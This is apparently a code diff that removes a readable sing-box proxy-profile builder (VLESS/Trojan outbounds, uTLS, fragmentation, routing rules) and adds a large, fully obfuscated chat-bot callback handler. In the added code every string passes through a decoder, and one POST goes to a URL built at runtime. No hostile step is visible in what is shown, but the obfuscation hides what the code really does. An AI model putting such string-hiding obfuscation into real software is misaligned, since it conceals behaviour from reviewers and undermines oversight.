+            await func_bf(var_adz, var_air);
+          } else {
+            if (!var_t) var_t = {
+              [func_dec(67)]: {}
+            };
+            if (!var_t[func_dec(67)]) var_t[func_dec(67)] = {};
+            const var_aiu = var_air[func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+            if (var_t[func_dec(67)][var_aiu]) {
+              var_t[func_dec(67)][var_aiu][func_dec(17)] = 0;
+              var_t[func_dec(67)][var_aiu][func_dec(23)] = 0;
+              var_t[func_dec(67)][var_aiu][func_dec(14)] = 0;
+              var_t[func_dec(67)][var_aiu][func_dec(22)] = 0;
             } else {
-                newOutbounds.push(ob);
+              var_t[func_dec(67)][var_aiu] = {
+                [func_dec(17)]: 0,
+                [func_dec(23)]: 0,
+                [func_dec(14)]: 0,
+                [func_dec(22)]: 0,
+                [func_dec(21)]: new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0]
+              };
             }
-        }
-        if (newOutbounds.length === 0) newOutbounds = outboundsArr;
-        tpl.outbounds = newOutbounds;
-        
-        // Inject Custom Routing
-        let cr = getCustomRouting();
-        if (cr.domains.length > 0) {
-            tpl.route.rules.unshift({ domain: cr.domains, outbound: "direct" });
-            tpl.route.rules.unshift({ domain_suffix: cr.domains, outbound: "direct" });
-        }
-        if (cr.ips.length > 0) {
-            tpl.route.rules.unshift({ ip_cidr: cr.ips, outbound: "direct" });
-        }
-        if (cr.geoips.length > 0) {
-            tpl.route.rules.unshift({ geoip: cr.geoips, outbound: "direct" });
-        }
-        if (cr.geosites.length > 0) {
-            tpl.route.rules.unshift({ geosite: cr.geosites, outbound: "direct" });
-        }
-        
-        return tpl;
-
-    }
-    return { outbounds: outboundsArr };
-}
-async function buildSingBoxJsonProfile(hostName, targetSub = null, allowInsecure = false, env = null) {
-    let ports = sysConfig.socketPorts
-        ? sysConfig.socketPorts
-              .split(",")
-              .map((s) => s.trim())
-              .filter(Boolean)
-        : ["443"];
-    let profiles = getAllProfiles(targetSub);
-    let allHostNames = [
-        ...new Set(profiles.flatMap((p) => getProfileHostNames(hostName, p))),
-    ];
-    await preloadIpFlags(profiles, allHostNames);
-    let proxyGeoInfo = new Map(); // proxyName -> {country, flag}
-    let reqPath = encodeURI(`/${sysConfig.apiRoute}`);
-
-    let outboundsArr = [];
-    let dynamicTags = [];
-    let nameCounts = {};
-
-    // Add fake configs
-    let fakeNames = getFakeConfigNames(targetSub);
-    let fakeRefs = [];
-    fakeNames.forEach((name) => {
-        outboundsArr.push({
-            type: "direct",
-            tag: name,
-        });
-        fakeRefs.push(name);
-    });
-
-    const getUniqueName = (baseName) => {
-        if (!nameCounts[baseName]) {
-            nameCounts[baseName] = 1;
-            return baseName;
-        }
-        let counter = nameCounts[baseName];
-        let newName = `${baseName}-${counter}`;
-        while (nameCounts[newName]) {
-            counter++;
-            newName = `${baseName}-${counter}`;
-        }
-        nameCounts[baseName] = counter + 1;
-        nameCounts[newName] = 1;
-        return newName;
-    };
-
-    profiles.forEach((p) => {
-        let pips = getEffectivePips(p);
-        let effectiveMode = p.userMode || sysConfig.mode;
-        let effectivePorts = p.userPorts
-            ? p.userPorts
-                  .split(",")
-                  .map((s) => s.trim())
-                  .filter(Boolean)
-            : ports;
-        let maxCfg = p.maxConfigs || null;
-
-        let configIndex = 0;
-        let profileHostNames = getProfileHostNames(hostName, p);
-
-        profileHostNames.forEach((hName) => {
-            let ipEntries = getCleanIpsWithNames(hName, p.cleanIp);
-            let allIps = ipEntries.map((e) => e.ip);
-            let ips = calcEffectiveIps(
-                allIps,
-                maxCfg,
-                effectiveMode,
-                effectivePorts,
-                pips.length
-            );
-            let ipNameMap = {};
-            ipEntries.forEach((e) => {
-                ipNameMap[e.ip] = e.name;
+            await func_t(var_aah, func_dec(139), JSON[func_dec(119)](var_t));
+          }
+          const var_ais = await func_en();
+          const var_ait = func_em(var_air, var_ais);
+          await func_ej(var_adw, func_dec(1172) + func_eh(func_dec(773)) + func_dec(1080) + var_ait[func_dec(200)] + func_dec(3), var_ait[func_dec(1103)], var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1156))) {
+          const var_aiv = var_ady[func_dec(155)](func_dec(1156), func_dec(3));
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1210) + var_aiv + func_dec(3)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_aiw = func_dec(1155) + func_eh(func_dec(771)) + func_dec(3);
+          const var_aix = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1110) + var_aiv + func_dec(3)
+            }]]
+          };
+          await func_ej(var_adw, var_aiw, var_aix, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1158))) {
+          const var_aiy = var_ady[func_dec(155)](func_dec(1158), func_dec(3));
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1211) + var_aiy + func_dec(3)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_aiz = func_dec(1157) + func_eh(func_dec(769)) + func_dec(3);
+          const var_aja = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1110) + var_aiy + func_dec(3)
+            }]]
+          };
+          await func_ej(var_adw, var_aiz, var_aja, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1160))) {
+          const var_ajb = var_ady[func_dec(155)](func_dec(1160), func_dec(3));
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1212) + var_ajb + func_dec(3)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_ajc = func_dec(1159) + func_eh(func_dec(779)) + func_dec(3);
+          const var_ajd = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1213),
+              [func_dec(480)]: func_dec(1214) + var_ajb + func_dec(3)
+            }], [{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1110) + var_ajb + func_dec(3)
+            }]]
+          };
+          await func_ej(var_adw, var_ajc, var_ajd, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1214))) {
+          const var_aje = var_ady[func_dec(155)](func_dec(1214), func_dec(3));
+          if (var_aea) {
+            await func_bd(var_adz, func_dec(124), var_aje, {
+              [func_dec(163)]: var_adz[func_dec(402)],
+              [func_dec(526)]: null
             });
-            effectivePorts.forEach((port) => {
-                let sec = getTransportParams(port) === "tls";
-                ips.forEach((ip) => {
-                    let isVless =
-                        effectiveMode === "alpha" || effectiveMode === "both";
-                    let isTrojan =
-                        effectiveMode === "beta" || effectiveMode === "both";
-                    let _pips = pips.length > 0 ? pips : [null];
-                    _pips.forEach((selectedProxyIp) => {
-                    let ipName = ipNameMap[ip] || "";
-
-                    if (isVless) {
-                        let tagStr = getConfigName(
-                            "alpha",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            selectedProxyIp,
-                            configIndex,
-                            ipName,
-                        );
-                        tagStr = getUniqueName(tagStr);
-                        dynamicTags.push(tagStr);
-
-                        let randomJunk = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadVl = {
-                            junk: randomJunk,
-                            protocol: "vl",
-                            mode: "proxyip",
-                            panelIPs: [],
-                        };
-                        let pathStrVl = "/" + btoa(JSON.stringify(payloadVl));
-
-                        let configUuid = generateConfigUuid(p.id, configIndex);
-                        registerConfigEntry(
-                            configUuid,
-                            p.id,
-                            selectedProxyIp || "",
-                        );
-
-                        let ob = {
-                            type: k_vl_mode,
-                            tag: tagStr,
-                            server: ip,
-                            server_port: parseInt(port),
-                            tcp_fast_open: sysConfig.enableOpt1 || false,
-                            uuid: configUuid,
-                            packet_encoding: "xudp",
-                            network: "tcp",
-                            tls: {
-                                enabled: sec,
-                                server_name: hName,
-                                insecure: allowInsecure,
-                                ...(isSegEnabled(p) ? { fragment: true } : {}),
-                                alpn: ["http/1.1"],
-                                utls: {
-                                    enabled: true,
-                                    fingerprint: "randomized",
-                                },
-                            },
-                            transport: {
-                                type: "ws",
-                                path: pathStrVl,
-                                max_early_data: 2560,
-                                early_data_header_name:
-                                    "Sec-WebSocket-Protocol",
-                                headers: {
-                                    Host: hName,
-                                },
-                            },
-                        };
-                        outboundsArr.push(ob);
-                    }
-
-                    if (isTrojan) {
-                        let tagStr = getConfigName(
-                            "beta",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            selectedProxyIp,
-                            configIndex,
-                            ipName,
-                        );
-                        tagStr = getUniqueName(tagStr);
-                        dynamicTags.push(tagStr);
-
-                        let randomJunk = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadTr = {
-                            junk: randomJunk,
-                            protocol: "tr",
-                            mode: "proxyip",
-                            panelIPs: [],
-                            relayIdx: configIndex,
-                        };
-                        let pathStrTr = "/" + btoa(JSON.stringify(payloadTr));
-
-                        let configUuid2 = generateConfigUuid(p.id, configIndex);
-                        registerConfigEntry(
-                            configUuid2,
-                            p.id,
-                            selectedProxyIp || "",
-                        );
-
-                        let ob = {
-                            type: k_tr_mode,
-                            tag: tagStr,
-                            server: ip,
-                            server_port: parseInt(port),
-                            tcp_fast_open: sysConfig.enableOpt1 || false,
-                            password: p.id,
-                            network: "tcp",
-                            tls: {
-                                enabled: sec,
-                                server_name: hName,
-                                insecure: allowInsecure,
-                                ...(isSegEnabled(p) ? { fragment: true } : {}),
-                                alpn: ["http/1.1"],
-                                utls: {
-                                    enabled: true,
-                                    fingerprint: "randomized",
-                                },
-                            },
-                            transport: {
-                                type: "ws",
-                                path: pathStrTr,
-                                max_early_data: 2560,
-                                early_data_header_name:
-                                    "Sec-WebSocket-Protocol",
-                                headers: {
-                                    Host: hName,
-                                },
-                            },
-                        };
-                        outboundsArr.push(ob);
-                    }
-                    configIndex++;
-                    if (sysConfig.enableDirectConfigs && pips.length > 0 && selectedProxyIp === pips[0]) {
-                        if (isVless) {
-                            let tagStr = getUniqueName(
-                                getConfigName(
-                                    "alpha",
-                                    p.name,
-                                    port,
-                                    hName,
-                                    ip,
-                                    null,
-                                    configIndex,
-                                    ipName, true
-                                ),
-                            );
-                            dynamicTags.push(tagStr);
-                            proxyGeoInfo.set(tagStr, getGeoInfo(ip));
-                            let randomJunk = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadVl = {
-                                junk: randomJunk,
-                                protocol: "vl",
-                                mode: "proxyip",
-                                panelIPs: [],
-                            };
-                            let pathStrVl =
-                                "/" + btoa(JSON.stringify(payloadVl));
-                            let configUuid = generateConfigUuid(
-                                p.id,
-                                configIndex,
-                            );
-                            registerConfigEntry(configUuid, p.id, "");
-                            let ob = {
-                                type: k_vl_mode,
-                                tag: tagStr,
-                                server: ip,
-                                server_port: parseInt(port),
-                                tcp_fast_open: sysConfig.enableOpt1 || false,
-                                uuid: configUuid,
-                                packet_encoding: "xudp",
-                                network: "tcp",
-                                tls: {
-                                    enabled: sec,
-                                    server_name: hName,
-                                    insecure: allowInsecure,
-                                    ...(isSegEnabled(p) ? { fragment: true } : {}),
-                                    alpn: ["http/1.1"],
-                                    utls: {
-                                        enabled: true,
-                                        fingerprint: "randomized",
-                                    },
-                                },
-                                transport: {
-                                    type: "ws",
-                                    path: pathStrVl,
-                                    max_early_data: 2560,
-                                    early_data_header_name:
-                                        "Sec-WebSocket-Protocol",
-                                    headers: { Host: hName },
-                                },
-                            };
-                            outboundsArr.push(ob);
-                        }
-                        if (isTrojan) {
-                            let tagStr = getUniqueName(
-                                getConfigName(
-                                    "beta",
-                                    p.name,
-                                    port,
-                                    hName,
-                                    ip,
-                                    null,
-                                    configIndex,
-                                    ipName, true
-                                ),
-                            );
-                            dynamicTags.push(tagStr);
-                            proxyGeoInfo.set(tagStr, getGeoInfo(ip));
-                            let randomJunk = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadTr = {
-                                junk: randomJunk,
-                                protocol: "tr",
-                                mode: "proxyip",
-                                panelIPs: [],
-                                relayIdx: configIndex,
-                            };
-                            let pathStrTr =
-                                "/" + btoa(JSON.stringify(payloadTr));
-                            let configUuid2 = generateConfigUuid(
-                                p.id,
-                                configIndex,
-                            );
-                            let ob = {
-                                type: k_tr_mode,
-                                tag: tagStr,
-                                server: ip,
-                                server_port: parseInt(port),
-                                tcp_fast_open: sysConfig.enableOpt1 || false,
-                                password: p.id,
-                                network: "tcp",
-                                tls: {
-                                    enabled: sec,
-                                    server_name: hName,
-                                    insecure: allowInsecure,
-                                    ...(isSegEnabled(p) ? { fragment: true } : {}),
-                                    alpn: ["http/1.1"],
-                                    utls: {
-                                        enabled: true,
-                                        fingerprint: "randomized",
-                                    },
-                                },
-                                transport: {
-                                    type: "ws",
-                                    path: pathStrTr,
-                                    max_early_data: 2560,
-                                    early_data_header_name:
-                                        "Sec-WebSocket-Protocol",
-                                    headers: { Host: hName },
-                                },
-                            };
-                            outboundsArr.push(ob);
-                        }
-                        configIndex++;
-                    }
-                    });
-                });
+          } else if (var_d[func_dec(67)]) {
+            const var_ajh = var_d[func_dec(67)][func_dec(260)](var_aji => var_aji[func_dec(172)] === var_aje);
+            if (var_ajh) {
+              var_ajh[func_dec(526)] = null;
+              await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+            }
+          }
+          const var_ajf = await func_en();
+          const var_ajg = func_em(var_aje, var_ajf);
+          await func_ej(var_adw, func_dec(1172) + func_eh(func_dec(750)) + func_dec(3), var_ajg[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(487)) {
+          const var_ajj = func_dec(301) + var_aai + func_dec(211) + var_d[func_dec(25)] + func_dec(3);
+          await func_e(func_dec(3) + var_aal + func_dec(196), {
+            [func_dec(123)]: func_dec(197),
+            [func_dec(104)]: {
+              [func_dec(198)]: func_dec(121)
+            },
+            [func_dec(125)]: JSON[func_dec(119)]({
+              [func_dec(199)]: var_adw,
+              [func_dec(200)]: func_dec(1071) + var_ajj + func_dec(1071),
+              [func_dec(201)]: func_dec(502)
+            })
+          });
+          var_aeb = func_eh(func_dec(833));
+        } else if (var_ady === func_dec(1096)) {
+          const var_ajk = var_d[func_dec(38)] === func_dec(39) ? func_dec(1119) : var_d[func_dec(38)] === func_dec(1120) ? func_dec(1121) : func_dec(1122);
+          const var_ajl = var_d[func_dec(42)] || func_dec(43);
+          const var_ajm = var_d[func_dec(31)] || func_dec(32);
+          const var_ajn = var_d[func_dec(46)] || func_dec(47);
+          const var_ajo = var_d[func_dec(29)] || func_dec(1123);
+          const var_ajp = var_d[func_dec(49)] ? func_dec(1215) : func_dec(1216);
+          const var_ajq = var_d[func_dec(50)] ? func_dec(1215) : func_dec(1216);
+          const var_ajr = var_d[func_dec(57)] ? func_dec(1217) : func_dec(1218);
+          const var_ajs = var_d[func_dec(58)] ? func_dec(1215) : func_dec(1216);
+          const var_ajt = var_d[func_dec(80)] ? func_dec(1215) : func_dec(1216);
+          const var_aju = var_d[func_dec(77)] ? func_dec(1215) : func_dec(1216);
+          const var_ajv = var_d[func_dec(76)] || func_dec(1123);
+          let var_ajw = func_dec(1219) + func_eh(func_dec(843)) + func_dec(1220);
+          var_ajw += func_dec(1221) + func_eh(func_dec(851)) + func_dec(1222) + var_ajk + func_dec(1125);
+          var_ajw += func_dec(1223) + func_eh(func_dec(853)) + func_dec(1224) + var_ajl + func_dec(1108);
+          var_ajw += func_dec(500) + func_eh(func_dec(859)) + func_dec(1224) + var_ajm + func_dec(1108);
+          var_ajw += func_dec(491) + func_eh(func_dec(860)) + func_dec(1224) + var_ajn + func_dec(1108);
+          var_ajw += func_dec(485) + func_eh(func_dec(862)) + func_dec(1224) + var_ajo + func_dec(1108);
+          var_ajw += func_dec(1225) + func_eh(func_dec(866)) + func_dec(1226) + var_ajp + func_dec(1227) + var_ajq + func_dec(468);
+          var_ajw += func_dec(1228) + func_eh(func_dec(870)) + func_dec(1226) + var_ajs + func_dec(468);
+          var_ajw += func_dec(1229) + func_eh(func_dec(872)) + func_dec(1226) + var_ajr + func_dec(468);
+          var_ajw += func_dec(1153) + func_eh(func_dec(874)) + func_dec(1226) + var_ajt + func_dec(468);
+          var_ajw += func_dec(1230) + func_eh(func_dec(876)) + func_dec(1226) + var_aju + func_dec(468);
+          var_ajw += func_dec(491) + func_eh(func_dec(878)) + func_dec(1224) + var_ajv + func_dec(1108);
+          var_ajw += func_dec(1088);
+          const var_ajx = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1221) + func_eh(func_dec(851)) + func_dec(3),
+              [func_dec(480)]: func_dec(1231)
+            }, {
+              [func_dec(200)]: func_dec(1223) + func_eh(func_dec(853)) + func_dec(3),
+              [func_dec(480)]: func_dec(1232)
+            }], [{
+              [func_dec(200)]: func_dec(500) + func_eh(func_dec(859)) + func_dec(3),
+              [func_dec(480)]: func_dec(1233)
+            }, {
+              [func_dec(200)]: func_dec(491) + func_eh(func_dec(860)) + func_dec(3),
+              [func_dec(480)]: func_dec(1234)
+            }], [{
+              [func_dec(200)]: func_dec(485) + func_eh(func_dec(862)) + func_dec(3),
+              [func_dec(480)]: func_dec(1235)
+            }], [{
+              [func_dec(200)]: func_dec(1225) + func_eh(func_dec(866)) + func_dec(3),
+              [func_dec(480)]: func_dec(1236)
+            }, {
+              [func_dec(200)]: func_dec(869),
+              [func_dec(480)]: func_dec(1237)
+            }], [{
+              [func_dec(200)]: func_dec(3) + func_eh(func_dec(870)) + func_dec(3),
+              [func_dec(480)]: func_dec(1238)
+            }, {
+              [func_dec(200)]: func_dec(3) + func_eh(func_dec(872)) + func_dec(3),
+              [func_dec(480)]: func_dec(1239)
+            }], [{
+              [func_dec(200)]: func_dec(1153) + func_eh(func_dec(874)) + func_dec(3),
+              [func_dec(480)]: func_dec(1240)
+            }, {
+              [func_dec(200)]: func_dec(1230) + func_eh(func_dec(876)) + func_dec(3),
+              [func_dec(480)]: func_dec(1241)
+            }], [{
+              [func_dec(200)]: func_dec(491) + func_eh(func_dec(878)) + func_dec(3),
+              [func_dec(480)]: func_dec(1242)
+            }], [{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_ajw, var_ajx, var_adx);
+        } else if (var_ady === func_dec(1098)) {
+          const var_ajy = var_d[func_dec(35)] ? var_d[func_dec(35)][func_dec(158)](0, 40) + (var_d[func_dec(35)][func_dec(135)] > 40 ? func_dec(627) : func_dec(3)) : func_dec(1123);
+          const var_ajz = (var_d[func_dec(72)] || [])[func_dec(144)](var_akg => var_akg[func_dec(206)])[func_dec(412)](Boolean);
+          const var_aka = var_ajz[func_dec(135)] > 0 ? var_ajz[func_dec(143)](func_dec(655))[func_dec(158)](0, 40) + (var_ajz[func_dec(143)](func_dec(655))[func_dec(135)] > 40 ? func_dec(627) : func_dec(3)) : func_dec(1123);
+          const var_akb = var_d[func_dec(61)] || func_dec(62);
+          const var_akc = var_d[func_dec(63)] || func_dec(64);
+          const var_akd = var_d[func_dec(27)] ? var_d[func_dec(27)][func_dec(158)](0, 30) + func_dec(627) : func_dec(1123);
+          let var_ake = func_dec(1243) + func_eh(func_dec(845)) + func_dec(1220);
+          var_ake += func_dec(1244) + func_eh(func_dec(880)) + func_dec(1224) + var_ajy + func_dec(1108);
+          var_ake += func_dec(1245) + func_eh(func_dec(882)) + func_dec(1224) + var_aka + func_dec(1108);
+          var_ake += func_dec(1157) + func_eh(func_dec(884)) + func_dec(1224) + var_akb + func_dec(1108);
+          var_ake += func_dec(1246) + func_eh(func_dec(886)) + func_dec(1224) + var_akc + func_dec(1108);
+          var_ake += func_dec(1247) + func_eh(func_dec(864)) + func_dec(1224) + var_akd + func_dec(1108);
+          var_ake += func_dec(1088);
+          const var_akf = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1244) + func_eh(func_dec(880)) + func_dec(3),
+              [func_dec(480)]: func_dec(1248)
+            }], [{
+              [func_dec(200)]: func_dec(1245) + func_eh(func_dec(882)) + func_dec(3),
+              [func_dec(480)]: func_dec(1249)
+            }], [{
+              [func_dec(200)]: func_dec(1157) + func_eh(func_dec(884)) + func_dec(3),
+              [func_dec(480)]: func_dec(1250)
+            }, {
+              [func_dec(200)]: func_dec(1246) + func_eh(func_dec(886)) + func_dec(3),
+              [func_dec(480)]: func_dec(1251)
+            }], [{
+              [func_dec(200)]: func_dec(1247) + func_eh(func_dec(864)) + func_dec(3),
+              [func_dec(480)]: func_dec(1252)
+            }], [{
+              [func_dec(200)]: func_dec(1253) + func_eh(func_dec(892)) + func_dec(3),
+              [func_dec(480)]: func_dec(1254)
+            }], [{
+              [func_dec(200)]: func_dec(1255) + func_eh(func_dec(890)) + func_dec(3),
+              [func_dec(480)]: func_dec(1256)
+            }], [{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_ake, var_akf, var_adx);
+        } else if (var_ady === func_dec(1100)) {
+          let var_akh = [];
+          if (var_aah[func_dec(126)]) {
+            const var_akk = await func_r(var_aah, func_dec(505));
+            if (var_akk) var_akh = JSON[func_dec(388)](var_akk);
+          }
+          let var_aki = func_dec(1257) + func_eh(func_dec(841)) + func_dec(1220);
+          if (var_akh[func_dec(135)] === 0) {
+            var_aki += func_dec(488) + func_eh(func_dec(907)) + func_dec(468);
+          } else {
+            var_akh[func_dec(145)](0, 10)[func_dec(176)]((var_akl, var_akm) => {
+              const var_akn = new Date(var_akl[func_dec(507)])[func_dec(1258)]();
+              var_aki += func_dec(3) + (var_akm + 1) + func_dec(1259) + func_eh(func_dec(906)) + func_dec(1260) + var_akl[func_dec(120)] + func_dec(1208) + var_akl[func_dec(508)] + func_dec(1261) + var_akn + func_dec(468);
             });
-        });
-    });
-
-    if (dynamicTags.length === 0) {
-        dynamicTags.push("direct");
-    }
-
-    // ─── Upstream chaining: add detour to all outbounds ───
-    let parsedUpstream = parseVlessUri(sysConfig.upstreamUri);
-    let upstreamTag = "";
-    if (parsedUpstream) {
-        let upstreamOb = upstreamToSingboxOb(parsedUpstream);
-        upstreamTag = upstreamOb.tag;
-        // Add detour to all generated outbounds so they chain through upstream
-        outboundsArr.forEach(ob => {
-            if (ob.type !== "direct" && ob.type !== "block" && ob.type !== "dns") {
-                ob.detour = upstreamTag;
-            }
-        });
-        // Insert upstream as first outbound
-        outboundsArr.unshift(upstreamOb);
-    }
-    
-    await fetchTemplates(env);
-    if (singboxTemplate) {
-        let tpl = JSON.parse(JSON.stringify(singboxTemplate));
-        let newOutbounds = [];
-        let allProxies = outboundsArr.map(o => o.tag);
-        
-        for (let ob of tpl.outbounds) {
-            if (ob === "__OUTBOUNDS__") {
-                newOutbounds.push(...outboundsArr);
-            } else if (ob.outbounds && ob.outbounds.includes("{all_proxies}")) {
-                let obCpy = { ...ob };
-                obCpy.outbounds = [];
-                for (let tag of ob.outbounds) {
-                    if (tag === "{all_proxies}") obCpy.outbounds.push(...allProxies);
-                    else obCpy.outbounds.push(tag);
-                }
-                newOutbounds.push(obCpy);
-            } else {
-                newOutbounds.push(ob);
-            }
+            if (var_akh[func_dec(135)] > 10) var_aki += func_dec(1262) + (var_akh[func_dec(135)] - 10) + func_dec(1263);
+          }
+          var_aki += func_dec(1264);
+          const var_akj = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1153) + func_eh(func_dec(835)) + func_dec(3),
+              [func_dec(480)]: func_dec(1100)
+            }], [{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_aki, var_akj, var_adx);
+        } else if (var_ady === func_dec(1236)) {
+          var_d[func_dec(49)] = !var_d[func_dec(49)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aeb = func_eh(func_dec(902));
+          const var_ako = func_ek(func_ei(), var_aap);
+          await func_ej(var_adw, var_ako[func_dec(200)], var_ako[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(1237)) {
+          var_d[func_dec(50)] = !var_d[func_dec(50)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aeb = func_eh(func_dec(902));
+          const var_akp = func_ek(func_ei(), var_aap);
+          await func_ej(var_adw, var_akp[func_dec(200)], var_akp[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(1238)) {
+          var_d[func_dec(58)] = !var_d[func_dec(58)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aeb = func_eh(func_dec(902));
+          const var_akq = func_ek(func_ei(), var_aap);
+          await func_ej(var_adw, var_akq[func_dec(200)], var_akq[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(1239)) {
+          var_d[func_dec(57)] = !var_d[func_dec(57)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aeb = func_eh(func_dec(902));
+          const var_akr = func_ek(func_ei(), var_aap);
+          await func_ej(var_adw, var_akr[func_dec(200)], var_akr[func_dec(1103)], var_adx);
+        } else if (var_ady === func_dec(1240)) {
+          var_d[func_dec(80)] = !var_d[func_dec(80)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aeb = func_eh(func_dec(902));
+          await func_ej(var_adw, func_dec(1095) + func_eh(func_dec(874)) + func_dec(1226) + (var_d[func_dec(80)] ? func_dec(1265) : func_dec(1266)) + func_dec(3), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1267) + func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1241)) {
+          var_d[func_dec(77)] = !var_d[func_dec(77)];
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aeb = func_eh(func_dec(902));
+          await func_ej(var_adw, func_dec(1230) + func_eh(func_dec(876)) + func_dec(1226) + (var_d[func_dec(77)] ? func_dec(1265) : func_dec(1266)) + func_dec(3), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1267) + func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1231)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1231)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_aks = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1268),
+              [func_dec(480)]: func_dec(1269)
+            }, {
+              [func_dec(200)]: func_dec(1270),
+              [func_dec(480)]: func_dec(1271)
+            }], [{
+              [func_dec(200)]: func_dec(1122),
+              [func_dec(480)]: func_dec(1272)
+            }], [{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          };
+          await func_ej(var_adw, func_dec(1137) + func_eh(func_dec(851)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1222) + var_d[func_dec(38)] + func_dec(1273) + func_eh(func_dec(900)) + func_dec(3), var_aks, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1274))) {
+          const var_akt = var_ady[func_dec(155)](func_dec(1274), func_dec(3));
+          var_d[func_dec(38)] = var_akt;
+          await func_t(var_aah, func_dec(138), JSON[func_dec(119)](var_d));
+          var_aaq[var_adw] = null;
+          var_aeb = func_eh(func_dec(902));
+          await func_ej(var_adw, func_dec(1172) + func_eh(func_dec(851)) + func_dec(1222) + var_akt + func_dec(1171), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1267) + func_eh(func_dec(716)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1234)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1234)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          await func_ej(var_adw, func_dec(1143) + func_eh(func_dec(860)) + func_dec(1125) + func_eh(func_dec(898)) + func_dec(1224) + var_d[func_dec(46)] + func_dec(1275) + func_eh(func_dec(900)) + func_dec(3), {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)),
+              [func_dec(480)]: func_dec(1096)
+            }]]
+          }, var_adx);
+        } else if (var_ady === func_dec(1235)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1235)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
